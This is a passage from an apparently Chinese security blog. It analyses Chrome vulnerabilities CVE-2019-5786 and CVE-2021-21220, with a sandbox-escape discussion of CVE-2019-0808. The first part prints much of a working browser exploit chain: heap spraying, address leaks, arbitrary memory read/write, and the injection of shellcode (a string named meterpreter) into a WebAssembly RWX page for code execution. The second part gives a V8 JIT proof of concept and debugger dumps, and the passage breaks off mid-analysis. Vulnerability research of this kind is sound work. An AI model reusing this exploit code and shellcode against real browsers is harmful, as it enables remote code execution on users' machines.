$&#123;onprogress_cnt&#125;, try again`);            failure = true;        &#125;        if (lastlast.byteLength != f.size) &#123;            console.log(`lastlast has a different size than expected: $&#123;lastlast.byteLength&#125;`);            failure = true;        &#125;        if (failure === true) &#123;            console.log(&#x27;retrying in 1 second&#x27;);            window.setTimeout(exploit, 1);            return;        &#125;        console.log(`onloadend attempt $&#123;try_cnt&#125; after $&#123;onprogress_cnt&#125; onprogress callbacks`);        // ...&#125;\n\n（4）触发漏洞直接调用postmessage可以触发漏洞，之后通过捕获到UAF的异常进入catch逻辑，执行get_rw()与rce()\nreader.onloadend = function(evt) &#123;        try &#123;            // postMessage触发catch，执行漏洞逻辑            myWorker.postMessage([last], [last, lastlast]);        &#125; catch(e) &#123;            if (e.message.includes(&#x27;ArrayBuffer at index 1 could not be transferred&#x27;)) &#123;                get_rw();                rce();                return;            &#125; else &#123;                console.log(e.message);            &#125;        &#125;    &#125;\n\n（5）类型混淆准备，相对地址读写//向spray[outers][inners]写入特定内容function reclaim_mixed() &#123;    let tmp = &#123;&#125;;    for (let i = 0; i &lt; outers; i++) &#123;        for (let j = 0; j + 2 &lt; inners; j+=3) &#123;            spray[i][j] = &#123;a: marker1, b: marker2, c: tmp&#125;;            spray[i][j].c = spray[i][j]     // 自己指向自己来得到绝对地址            spray[i][j+1] = new Array(8);            spray[i][j+2] = new Uint32Array(32);        &#125;    &#125;&#125;\n\n其实就是对spray数组循环存取下面的内存布局\n\n{\n​    {\n​        {a: marker1, b: marker2, c:  spray[i][j]};\n​    }    \n​    Array(8);\n​    Uint32Array(32);\n}\n\n之后可以通过tarray搜索到marker1的flag内存区域，然后根据偏移找到对象地址以及tarray的首地址\ntarray = new Uint32Array(lastlast);             //倒数第二个onprogress返回值。// find_pattern的过程object_prop_taidx = find_pattern();             //通过marker1寻找偏移// ...// 泄漏对象的绝对地址const obj_absolute_addr = tarray[object_prop_taidx + 2] - 1;  //通过 spray[i][j].c 泄露对象的地址ta_absolute_addr = obj_absolute_addr - (object_prop_taidx-3)*4   console.log(`leaked absolute address of our object $&#123;obj_absolute_addr.toString(16)&#125;`);console.log(`leaked absolute address of ta $&#123;ta_absolute_addr.toString(16)&#125;`);reader_obj = get_obj_idx(object_prop_taidx);                        //通过tarray的索引找到spray的索引// ...// 现在reader_obj是对Object的引用，object_prop_taidx是从ta开头的第一个内联属性的索引console.log(`addrof(reader_obj) == $&#123;addrof(reader_obj)&#125;`);             //这个addrof(reader_obj)-1 == obj_absolute_addraarw_ui32 = get_corruptable_ui32a();                //这个函数返回了很多东西\n\nspray[i][j]的内存现场如下\n0:016&gt; dd 9770B8C09770b8c  047008bd 03a0066d 03a0066d 6c62646609770b9c  6e828a8c 09770b8d 03a00435 00000010\n\n之后得到了相对地址读写的功能\nfunction ta_read(addr) &#123;    // 通过原始的释放区域读取绝对地址    // 最大长度为ta_absolute_addr + string_size（128MiB）    if (addr &gt; ta_absolute_addr &amp;&amp; addr &lt; ta_absolute_addr + string_size) &#123;        return tarray[(addr-ta_absolute_addr)/4];    &#125;    return 0;&#125;function ta_write(addr, value) &#123;    // 通过原始的释放区域写入绝对地址    // 最大长度为ta_absolute_addr + string_size（128MiB）    if (addr % 4 || value &gt; 2**32 - 1 ||        addr &lt; ta_absolute_addr ||        addr &gt; ta_absolute_addr + string_size) &#123;        console.log(`invalid args passed to ta_write($&#123;addr.toString(16)&#125;, $&#123;value&#125;`);    &#125;    tarray[(addr-ta_absolute_addr)/4] = value;&#125;\n\n接下来就可以通过类型混淆得到addressof的功能了\nfunction addrof(leaked_obj) &#123;    reader_obj.a = leaked_obj;    return tarray[object_prop_taidx];&#125;\n\n（6）任意地址读写利用相对地址读写可以读写被腐烂缓冲区的backing_store，从而达到任意地址读写的目的\nfunction get_corruptable_ui32a() &#123;    // 找到一个喷射的Uint32Array，其元素指针也落入受控区域    for (let i = 0; i &lt; outers; i++) &#123;        for (let j = 0; j + 2 &lt; inners; j+=3) &#123;            let ui32a_addr = addrof(spray[i][j+2]) - 1;            let bs_addr = ta_read(ui32a_addr + 12) - 1;            let elements_addr = ta_read(ui32a_addr + 8) - 1;            // 读取其元素指针            // 如果元素指针位于我们可以访问的区域内            if (bs_addr &gt;= ta_absolute_addr &amp;&amp; bs_addr &lt; ta_absolute_addr + string_size &amp;&amp;                 elements_addr &gt;= ta_absolute_addr &amp;&amp; elements_addr &lt; ta_absolute_addr + string_size) &#123;                console.log(`found corruptable Uint32Array-&gt;elements at $&#123;bs_addr.toString(16)&#125;, on Uint32Array idx $&#123;i&#125; $&#123;j&#125;`);                return &#123;                    bs_addr: bs_addr,                    elements_addr: elements_addr,                    ui32: spray[i][j+2],                    i: i, j: j                &#125;            &#125;        &#125;    &#125;&#125;function read4(addr) &#123;    // save the old values    let tmp1 = ta_read(aarw_ui32.elements_addr + 12);    let tmp2 = ta_read(aarw_ui32.bs_addr + 16);    // rewrite the backing store ptr    ta_write(aarw_ui32.elements_addr + 12, addr);     ta_write(aarw_ui32.bs_addr + 16, addr);    let val = aarw_ui32.ui32[0];    ta_write(aarw_ui32.elements_addr + 12, tmp1);     ta_write(aarw_ui32.bs_addr + 16, tmp2);    return val;&#125;function write4(addr, val) &#123;    // save the old values    let tmp1 = ta_read(aarw_ui32.elements_addr + 12);    let tmp2 = ta_read(aarw_ui32.bs_addr + 16);    // rewrite the backing store ptr    ta_write(aarw_ui32.elements_addr + 12, addr);     ta_write(aarw_ui32.bs_addr + 16, addr);    aarw_ui32.ui32[0] = val;    ta_write(aarw_ui32.elements_addr + 12, tmp1);     ta_write(aarw_ui32.bs_addr + 16, tmp2);&#125;\n\n（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行var wfunc = null;let meterpreter = unescape(&quot;%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u652e%u6578%u4100&quot;);function rce() &#123;    function get_wasm_func() &#123;        var importObject = &#123;            imports: &#123; imported_func: arg =&gt; console.log(arg) &#125;        &#125;;        bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];        wasm_code = new Uint8Array(bc);        wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);        return wasm_mod.exports.exported_func;    &#125;    let wasm_func = get_wasm_func();    wfunc = wasm_func;    // traverse the JSFunction object chain to find the RWX WebAssembly code page    let wasm_func_addr = addrof(wasm_func) - 1;    let sfi = read4(wasm_func_addr + 12) - 1;    let WasmExportedFunctionData = read4(sfi + 4) - 1;    let instance = read4(WasmExportedFunctionData + 8) - 1;    let rwx_addr = read4(instance + 0x74);    // 向RWX内存页中写入shellcode    if (meterpreter.length % 2 != 0)        meterpreter += &quot;\\\\u9090&quot;;      for (let i = 0; i &lt; meterpreter.length; i += 2) &#123;        write4(rwx_addr + i*2, meterpreter.charCodeAt(i) + meterpreter.charCodeAt(i + 1) * 0x10000);    &#125;    // 到了这步证明攻击已经成功了    window.top.postMessage(&#x27;SUCCESS&#x27;, &#x27;*&#x27;);    console.log(&#x27;success&#x27;);    // 调用shellcode    window.setTimeout(wfunc, 1000);&#125;\n\nblink的漏洞利用相对于v8的类型混淆来说看起来好像更复杂一些，需要的操作也要更麻烦一些，但是利用的核心思想仍然是类型混淆造成任意地址读写，并通过WebAssembly技术进行rce。\n该漏洞利用程序开发的难点在于调试环境的获取，由于某些已知原因，国内的chromium源码编译环境异常难以搭建，只能通过符号服务器或者符号文件+二进制程序进行二进制层面的调试，这样就对exp的调试造成了比较大的阻碍。\n（5）简述CVE-2019-0808与沙箱逃逸本节内容参考[16]，[17]\n我们知道，Chrome基于多进程架构，主要包括浏览器进程和渲染进程，进程间通过IPC通信（Mojo）\n其中渲染进程运行着不可信的HTML和JS代码，浏览器中的每一个tab为一个独立的进程，运行在Untrusted的低权限等级，并通过沙箱引擎隔离。因此像CVE-2019-5768这样的渲染进程中的远程代码执行漏洞仍需要结合其他高权限漏洞实现沙箱逃逸。一般来说有几种思路：1）利用浏览器进程的漏洞，比如IndexedDB，Mojo等； 2）利用操作系统内核漏洞，比如与CVE-2019-5768组合的win32k.sys内核提权漏洞CVE-2019-0808。\nCVE-2019-0808是win32k.sys中的一个空指针解引用漏洞。由于代码未对返回窗口指针的类型进行检查，导致程序可以进行空指针解引用，由于win8以上的windows无法在零页分配内存，所以该漏洞的危害性相对较低，不过仍然可以配合CVE-2019-5786达到杀向逃逸的目的。\n简单描述一下CVE-2019-0808的漏洞原理，xxxMNFindWindowFromPoint函数通过xxxSendMessage获取pPopupMenu，之后并未对pPopupMenu做任何校验，攻击者通过SetWinEventHook获取该事件伪造NULL指针赋值给pPopupMenu-&gt;spmenu并返回给内核，触发漏洞。\n在完成了内核提权exp后，接下来需要考虑如何结合Chrome渲染进程的漏洞实现沙箱逃逸。首先可以考虑将内核提权exp以dll的形式编译，然后加载到目标进程，执行提权操作。但是由于Chrome渲染进程运行在Untrusted权限，无法直接利用漏洞获取shellcode执行权限后注入提权dll，需要考虑其他方法。\n反射型dll注入就是一个比较好的方法，github中有相关项目可以直接使用[18]：\n\n该利用链参考[19]，实测发现个人机器在关闭沙箱时可以执行shellcode弹出system的cmd，但是在开启沙箱的时候会造成下述状况：\n\ncrash log如下\nVIRTUAL_MACHINE:  VMwareBUGCHECK_CODE:  1BUGCHECK_P1: 114dBUGCHECK_P2: 0BUGCHECK_P3: ffffBUGCHECK_P4: 0CUSTOMER_CRASH_COUNT:  1PROCESS_NAME:  chrome.exeSTACK_TEXT:      &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt;8ade0c34 779270b4 (T) badb0d00 8ade0b00 00000000 nt!KiServiceExit2+0x17aWARNING: Frame IP not in any known module. Following frames may be wrong.    &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt;8ade0b34 00000000 (T) 00000000 00000000 00000000 0x779270b4SYMBOL_NAME:  nt!KiServiceExit2+17aMODULE_NAME: ntIMAGE_NAME:  ntkrpamp.exeIMAGE_VERSION:  6.1.7601.17514STACK_COMMAND:  .thread ; .cxr ; kbFAILURE_BUCKET_ID:  0x1_SysCallNum_11ea_nt!KiServiceExit2+17aOS_VERSION:  7.1.7601.17514BUILDLAB_STR:  win7sp1_rtmOSPLATFORM_TYPE:  x86OSNAME:  Windows 7FAILURE_ID_HASH:  &#123;8f36ef45-2344-18c7-dc3e-a379cfe2ebc4&#125;Followup:     MachineOwner---------\n\n四、总结与思考该漏洞为blink相关的逻辑漏洞，由于异步的特性导致代码逻辑出现问题，最终生成了两个指向同一内存的指针，该漏洞的质量很高，在被曝出时就被发现与CVE-2019-0808配合绕过沙箱实现RCE，是一个比较值得研究的blink漏洞。\n五、参考[1] https://developer.mozilla.org/zh-CN/docs/Web/API/FileReader\n[2] https://www.chromium.org/developers/how-tos/debugging-on-windows/windbg-help\n[3] https://www.chromium.org/getting-involved/download-chromium\n[4] https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/612429/\n[5] https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win/612432/\n[6] http://www.ruanyifeng.com/blog/2018/07/web-worker.html\n[7] https://www.cnblogs.com/SZxiaochun/p/8017475.html\n[8] https://www.cnblogs.com/yoyo-sincerely/p/8658075.html\n[9] https://zhuanlan.zhihu.com/p/94588204\n[10] https://www.jianshu.com/p/c2cd6c7e1976\n[11] https://www.anquanke.com/post/id/194351\n[12] https://www.4hou.com/posts/7OYQ\n[13] https://github.com/exodusintel/CVE-2019-5786/\n[14] https://programlife.net/2019/03/25/cve-2019-5786-chrome-filereader-use-after-free-vulnerability-analysis/\n[15] https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/\n[16] https://www.anquanke.com/post/id/197892\n[17] https://blogs.360.cn/post/RootCause_CVE-2019-0808_CH.html\n[18] https://github.com/monoxgas/sRDI\n[19] https://github.com/exodusintel/CVE-2019-0808\n"},{"title":"CVE-2021-21220","url":"/2021/04/30/CVE-2021-21220/","content":"V8远程代码执行漏洞一、漏洞信息1、漏洞简述\n漏洞名称：V8远程代码执行漏洞\n漏洞编号：CVE-2021-21220\n漏洞类型：JIT优化导致可构造超长数组进行任意地址读写\n漏洞影响：远程代码执行\nCVSS3.0：N/A\nCVSS2.0：N/A\n漏洞危害等级：严重\n\n2、组件和漏洞概述V8是Google使用C++编写的开源高性能JavaScript和WebAssembly引擎。它被广泛用于用于Chrome和Node.js等场景中。它实现了ECMAScript和WebAssembly功能。V8既可以在Windows 7及以上版本，macOS 10.12+和使用x64，IA-32，ARM或MIPS处理器的Linux等操作系统上运行。也可以独立运行，还可以嵌入到任何C ++应用程序中。\n3、相关链接issue 1196683\n4、解决方案Chrome最新版本已经修复，请用户及时更新至最新版本。\n二、漏洞复现1、环境搭建安装89.0.4389.90的Chrome浏览器\n2、复现过程1、在Chrome快捷方式-&gt;目标后面加上”–no-sandbox”，并使用该快捷方式启动Chrome，用来创建一个关闭沙箱的Chrome进程。\n2、将漏洞文件拖入浏览器中执行\n\n三、漏洞分析1、基本信息\n漏洞文件：instruction-selector-x64.cc\n漏洞函数：InstructionSelector::VisitChangeInt32ToInt64\n\n2、背景知识(1) js中array-shift实现。\nv8源码版本: V8 version 9.1.0 (candidate)\n（1）array-shift.tq// Copyright 2019 the V8 project authors. All rights reserved.// Use of this source code is governed by a BSD-style license that can be// found in the LICENSE file.namespace array &#123;extern builtin ArrayShift(Context, JSFunction, JSAny, int32): JSAny;macro TryFastArrayShift(implicit context: Context)(receiver: JSAny): JSAny    labels Slow, Runtime &#123;  const array: FastJSArray = Cast&lt;FastJSArray&gt;(receiver) otherwise Slow;  let witness = NewFastJSArrayWitness(array);  witness.EnsureArrayPushable() otherwise Slow;  if (array.length == 0) &#123;    return Undefined;  &#125;  const newLength = array.length - 1;  // Check that we&#x27;re not supposed to right-trim the backing store, as  // implemented in elements.cc:ElementsAccessorBase::SetLengthImpl.  if ((newLength + newLength + kMinAddedElementsCapacity) &lt;      array.elements.length) &#123;    goto Runtime;  &#125;  // Check that we&#x27;re not supposed to left-trim the backing store, as  // implemented in elements.cc:FastElementsAccessor::MoveElements.  if (newLength &gt; kMaxCopyElements) goto Runtime;  const result = witness.LoadElementOrUndefined(0);  witness.ChangeLength(newLength);  witness.MoveElements(0, 1, Convert&lt;intptr&gt;(newLength));  witness.StoreHole(newLength);  return result;&#125;transitioning macro GenericArrayShift(implicit context: Context)(    receiver: JSAny): JSAny &#123;  // 1. Let O be ? ToObject(this value).  const object: JSReceiver = ToObject_Inline(context, receiver);  // 2. Let len be ? ToLength(? Get(O, &quot;length&quot;)).  const length: Number = GetLengthProperty(object);  // 3. If len is zero, then  if (length == 0) &#123;    // a. Perform ? Set(O, &quot;length&quot;, 0, true).    SetProperty(object, kLengthString, Convert&lt;Smi&gt;(0));    // b. Return undefined.    return Undefined;  &#125;  // 4. Let first be ? Get(O, &quot;0&quot;).  const first = GetProperty(object, Convert&lt;Smi&gt;(0));  // 5. Let k be 1.  let k: Number = 1;  // 6. Repeat, while k &lt; len  while (k &lt; length) &#123;    // a. Let from be ! ToString(k).    const from: Number = k;    // b. Let to be ! ToString(k - 1).    const to: Number = k - 1;    // c. Let fromPresent be ? HasProperty(O, from).    const fromPresent: Boolean = HasProperty(object, from);    // d. If fromPresent is true, then    if (fromPresent == True) &#123;      // i. Let fromVal be ? Get(O, from).      const fromValue: JSAny = GetProperty(object, from);      // ii. Perform ? Set(O, to, fromValue, true).      SetProperty(object, to, fromValue);    &#125; else &#123;      // i. Perform ? DeletePropertyOrThrow(O, to).      DeleteProperty(object, to, LanguageMode::kStrict);    &#125;    // f. Increase k by 1.    k++;  &#125;  // 7. Perform ? DeletePropertyOrThrow(O, ! ToString(len - 1)).  DeleteProperty(object, length - 1, LanguageMode::kStrict);  // 8. Perform ? Set(O, &quot;length&quot;, len - 1, true).  SetProperty(object, kLengthString, length - 1);  // 9. Return first.  return first;&#125;// https://tc39.github.io/ecma262/#sec-array.prototype.shifttransitioning javascript builtin ArrayPrototypeShift(    js-implicit context: NativeContext, receiver: JSAny)(...arguments): JSAny &#123;  try &#123;    return TryFastArrayShift(receiver) otherwise Slow, Runtime;  &#125; label Slow &#123;    return GenericArrayShift(receiver);  &#125; label Runtime &#123;    tail ArrayShift(        context, LoadTargetFromFrame(), Undefined,        Convert&lt;int32&gt;(arguments.length));  &#125;&#125;&#125;\n\nshift函数首先会判断数组的长度是否为0，如果为0，则不会对该数组进行修改；如果不为0，则会将最前面的数组元素pop，之后对数组长度减一。当然这里会有是否进行快速shift的选择[7]，由于不管是否进行快速shift都不会影响这个操作结果，所以具体快速shift如何对速度进行优化不在我们的考虑范围内。\n（2）smismi在js中为小整数，详见[5]，链接中讲述了v8中不同数据类型的实现。\nsmi类型中的-1，0，1在内存中的表示如下\npwndbg&gt; job 0x3c6c0808846d0x3c6c0808846d: [JSArray] - map: 0x3c6c08243951 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties] - prototype: 0x3c6c0820b959 &lt;JSArray[0]&gt; - elements: 0x3c6c082123e1 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)] - length: 3 - properties: 0x3c6c0804222d &lt;FixedArray[0]&gt; - All own properties (excluding elements): &#123;    0x3c6c080446c1: [String] in ReadOnlySpace: #length: 0x3c6c0818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor &#125; - elements: 0x3c6c082123e1 &lt;FixedArray[3]&gt; &#123;           0: -1           1: 0           2: 1 &#125;pwndbg&gt; telescope 0x3c6c082123e000:0000│  0x3c6c082123e0 ◂— 0x60804253101:0008│  0x3c6c082123e8 ◂— 0xfffffffe02:0010│  0x3c6c082123f0 ◂— 0x80431b90000000203:0018│  0x3c6c082123f8 ◂— 0x82123e10000000004:0020│  0x3c6c08212400 ◂— 0x804250905:0028│  0x3c6c08212408 ◂— 0x60804220506:0030│  0x3c6c08212410 ◂— 0x82123f5082123d507:0038│  0x3c6c08212418 ◂— 0x8042a1d08212345\n\n可以看出-1在smi中表示为0xfffffffe，而0xfffffffe在十六进制有符号表示为-2，这块需要注意。\n（3）常见数据结构浮点型数组pwndbg&gt; job 0x560081443350x56008144335: [JSArray] - map: 0x0560082439f1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties] - prototype: 0x05600820b959 &lt;JSArray[0]&gt; - elements: 0x056008144315 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS] - length: 3 - properties: 0x05600804222d &lt;FixedArray[0]&gt; - All own properties (excluding elements): &#123;    0x560080446c1: [String] in ReadOnlySpace: #length: 0x05600818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor &#125; - elements: 0x056008144315 &lt;FixedDoubleArray[3]&gt; &#123;           0: 1.1           1: 1.2           2: 1.3 &#125;pwndbg&gt; x/20wx 0x56008144335-10x56008144334:  0x082439f1      0x0804222d      0x08144315      0x000000060x56008144344:  0x080455b9      0x08212999      0x08042205      0x000000040x56008144354:  0x081442fd      0x08144335      0x08243a41      0x0804222d0x56008144364:  0x0814434d      0x00000004      0x080455b9      0x082129c50x56008144374:  0x08042a95      0x00000002      0x00000000      0x41e00000pwndbg&gt; telescope 0x05600814431400:0000│  0x56008144314 ◂— 0x608042a9501:0008│  0x5600814431c ◂— 0x3ff199999999999a02:0010│  0x56008144324 ◂— 0x3ff333333333333303:0018│  0x5600814432c ◂— 0x3ff4cccccccccccd04:0020│  0x56008144334 ◂— 0x804222d082439f105:0028│  0x5600814433c ◂— 0x60814431506:0030│  0x56008144344 ◂— 0x8212999080455b907:0038│  0x5600814434c ◂— 0x408042205\n\n根据上面的内存可以看出，浮点数的属性值是按照四字节存储的，elements在0x8的偏移，0xc的位置上存放length。elements对象的第一个元素的偏移为0x8。\n“smi数组”DebugPrint: 0x367b082a9c29: [JSArray] - map: 0x367b082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; [FastProperties] - prototype: 0x367b0820b959 &lt;JSArray[0]&gt; - elements: 0x367b082a9c1d &lt;FixedArray[67244566]&gt; [HOLEY_SMI_ELEMENTS] - length: -1 - properties: 0x367b0804222d &lt;FixedArray[0]&gt; - All own properties (excluding elements): &#123;    0x367b080446c1: [String] in ReadOnlySpace: #length: 0x367b0818215d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor &#125; - elements: 0x367b082a9c1d &lt;FixedArray[67244566]&gt; &#123;           0: 0x367b0804242d &lt;the_hole&gt;           1: 0x367b082439c9 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;           2: 0x367b0804222d &lt;FixedArray[0]&gt;           3: 0x367b082a9c1d &lt;FixedArray[67244566]&gt;           4: -1           5: 0x367b08042a95 &lt;Map&gt;           6: 3           7: -858993459...pwndbg&gt; x/12wx 0x367b082a9c1d-10x367b082a9c1c: 0x08042205      0x0804242d      0x0804242d      0x082439c90x367b082a9c2c: 0x0804222d      0x082a9c1d      0xfffffffe      0x08042a950x367b082a9c3c: 0x00000006      0x9999999a      0x3ff19999      0x33333333pwndbg&gt; x/8wx 0x367b082a9c29-10x367b082a9c28: 0x082439c9      0x0804222d      0x082a9c1d      0xfffffffe0x367b082a9c38: 0x08042a95      0x00000006      0x9999999a      0x3ff19999\n\n这是个伪smi数组，是由于本漏洞构造的超长数组的现场。\n根据上面的内存可以看出，浮点数的属性值是按照四字节存储的，elements在0x8的偏移，0xc的位置上存放length。elements对象的第一个元素的偏移为0x8。（和上面的浮点型数组内存构造是相同的）\n在本漏洞利用中，可以通过相对地址写覆盖浮点型数组的长度伪超长，使浮点型数组也具有相对地址读写的能力。\n(4)指针压缩参考[89]。64位v8程序中，堆指针高32位地址值是相同的，可以看下面某次v8的调试信息，高32位的的地址值为0xdf2，这个信息存储在寄存器R13位置处。\npwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA     0xdf200000000      0xdf20000d000 rw-p     d000 0     0xdf20000d000      0xdf200040000 ---p    33000 0     0xdf200040000      0xdf200170000 r-xp   130000 0     0xdf200170000      0xdf200180000 ---p    10000 0     0xdf200180000      0xdf200183000 rw-p     3000 0     0xdf200183000      0xdf200184000 ---p     1000 0     0xdf200184000      0xdf200194000 r-xp    10000 0     0xdf200194000      0xdf2001bf000 ---p    2b000 0     0xdf2001bf000      0xdf2001c0000 ---p     1000 0     0xdf2001c0000      0xdf2001c3000 rw-p     3000 0     0xdf2001c3000      0xdf2001c4000 ---p     1000 0     0xdf2001c4000      0xdf2001ff000 r-xp    3b000 0     0xdf2001ff000      0xdf208040000 ---p  7e41000 0     0xdf208040000      0xdf208061000 r--p    21000 0     0xdf208061000      0xdf208080000 ---p    1f000 0     0xdf208080000      0xdf20818d000 rw-p   10d000 0     0xdf20818d000      0xdf2081c0000 ---p    33000 0     0xdf2081c0000      0xdf2081c3000 rw-p     3000 0     0xdf2081c3000      0xdf208200000 ---p    3d000 0     0xdf208200000      0xdf2083c0000 rw-p   1c0000 0     0xdf2083c0000      0xdf300000000 ---p f7c40000 0    0x55fe3a44c000     0x55fe3ac71000 r--p   825000 0      /root/v8/v8/out/x64.release/d8    0x55fe3ac71000     0x55fe3ba48000 r-xp   dd7000 824000 /root/v8/v8/out/x64.release/d8    0x55fe3ba48000     0x55fe3bab5000 r--p    6d000 15fa000 /root/v8/v8/out/x64.release/d8    0x55fe3bab5000     0x55fe3bac4000 rw-p     f000 1666000 /root/v8/v8/out/x64.release/d8... RAX  0x0 RBX  0xdf200000000 —▸ 0x7fffaaa90cf8 ◂— 0xdf200000000 RCX  0xdf20013f500 ◂— push   rbp RDX  0xdf200000000 —▸ 0x7fffaaa90cf8 ◂— 0xdf200000000 RDI  0x0 RSI  0x7fffaaa8fd00 —▸ 0xdf208042895 ◂— 0x80428 R8   0xdf20821289d ◂— 0x7500000006082442 R9   0x145 R10  0xc00000000 R11  0xfffffffffffffffa R12  0x55fe3c799170 ◂— 0x0 R13  0xdf200000000 —▸ 0x7fffaaa90cf8 ◂— 0xdf200000000 R14  0x55fe3ba73160 (v8::internal::kIntrinsicFunctions) ◂— 0x0 R15  0x55fe3c7975e0 ◂— 0x1baddead0baddeaf RBP  0x7fffaaa8fc20 —▸ 0x7fffaaa8fc50 —▸ 0x7fffaaa8fc78 —▸ 0x7fffaaa8fc98 —▸ 0x7fffaaa8fd30 ◂— ... RSP  0x7fffaaa8fc20 —▸ 0x7fffaaa8fc50 —▸ 0x7fffaaa8fc78 —▸ 0x7fffaaa8fc98 —▸ 0x7fffaaa8fd30 ◂— ... RIP  0x55fe3b8ca445 (v8::base::OS::DebugBreak()+5) ◂— pop    rbp\n\n现代CPU中的分支预测器非常好，并且代码大小（尤其是执行路径长度）对性能的影响更大。\n具体的实现可以参考\nv8 / src / common / ptr-compr.hv8 / src / common / ptr-compr-inl.h\n\n\n\n3、补丁对比根据issue里面的补丁比较链接\nhttps://chromium-review.googlesource.com/c/v8/v8/+/2820971/3/src/compiler/backend/x64/instruction-selector-x64.cc#1381\n\n可以看出该bugfix的函数为ChangeInt32ToInt64，将32位整形数向64位进行拓展，修复之前的代码为判断传入的32位整型数是否为有符号从而选择movsx和mov，而修复后强制使用movsx进行有符号拓展。\n4、漏洞分析（1）POC分析POC与执行结果如下。\nprint = console.log;const arr = new Uint32Array([2**31]);\t\t// 定义了一个只有一个元素的Uint32类型的数组function foo() &#123;    return (arr[0] ^ 0) + 1;    \t\t\t// 漏洞触发&#125;\t\t\t\t\t\t\t\t\t\t print(foo());//-2147483647\t\t\t\t\t// 解释器工作for(let i=0;i&lt;100000;i++)\t\t\t\t\t//代码价值提升，交由JIT处理    foo();print(foo());//2147483649\t\t\t\t\t//JIT处理后的结果\n\nroot@ubuntu:~/v8/v8/out/x64.release# ./d8 test_jscode/d8_poc.js-21474836472147483649\n\n我们对POC进行分析，首先分析arr数组元素\narr[0]是unsigned int32 = 2**31 = 2147483648 = 0x8000 0000\n arr[0] ^ 0会转成signed int32 = 2**31^0 = 0x8000 0000 = -2147483648，至于为什么无符号操作数与0异或变为有符号，参考[4]。\n\n (arr[0] ^ 0) + 1会转成signed int64，按理说是先符号拓展，得到0xFFFF FFFF 8000 0000，然后再加一，得到0xFFFF FFFF 8000 0001 = -2147483647\n之后会解释器执行打印函数返回值以及JIT编译执行打印函数返回值\n可以看到，在经过JIT优化前与优化后，foo的返回值是不相同的；这个从上面的补丁分析中我们也已经了解了，JIT在处理代码的时候将本该有符号拓展的数进行了无符号拓展。\n（2）执行流分析SimplifiedLowering在该阶段，通过#45 LoadTypedElement可以知道arr[0]的类型 Unsigned32，之后#31 Word32Xor处理之后类型为Signed32，之后+1需要做int32到int64的转换，调用了#58 ChangeInt32ToInt64，并将返回值与#59 Int64Constant[1]作为参数交由#50 ChangeInt32ToInt64处理。这段处理逻辑是没有问题的。\n\nMachineOperatorOptimization而在该阶段，将arr[0] ^ 0通过JIT在#81 Load处获取运算所得的结果，此时该结果的类型为kRepWord32[kTypeUint32]，为无符号，此时仍然经过#58 ChangeInt32ToInt64进行处理。\n\n而ChangeInt32ToInt64的处理如下\n...case MachineRepresentation::kWord32:        opcode = load_rep.IsSigned() ? kX64Movsxlq : kX64Movl;...\n\n由于操作数时无符号，所以这里进行了无符号拓展，此时(arr[0] ^ 0) + 1的值为0 x 0000 0000 8000 0000 + 1，为2147483649。\n（3）动态验证通过gdb验证下我们上述分析的过程，动态分析的思路为通过%DebugPrint输出得到arr元素的内存地址，然后下内存读断点，追踪到JIT处理foo函数的位置。\n定位流程\nroot@ubuntu:~/v8/v8/out/x64.release# gdb d8...pwndbg&gt; set args --allow-natives-syntax test_jscode/d8_poc.jspwndbg&gt; r...-2147483647DebugPrint: 0x4e60808851d: [JSTypedArray] - map: 0x04e608243109 &lt;Map(UINT32ELEMENTS)&gt; [FastProperties] - prototype: 0x04e608209815 &lt;Object map = 0x4e608243131&gt; - elements: 0x04e608088511 &lt;ByteArray[4]&gt; [UINT32ELEMENTS] - embedder fields: 2 - buffer: 0x04e6080884d9 &lt;ArrayBuffer map = 0x4e6082431f9&gt; - byte_offset: 0 - byte_length: 4 - length: 1 - data_ptr: 0x4e608088518   - base_pointer: 0x8088511   - external_pointer: 0x4e600000007 - properties: 0x04e60804222d 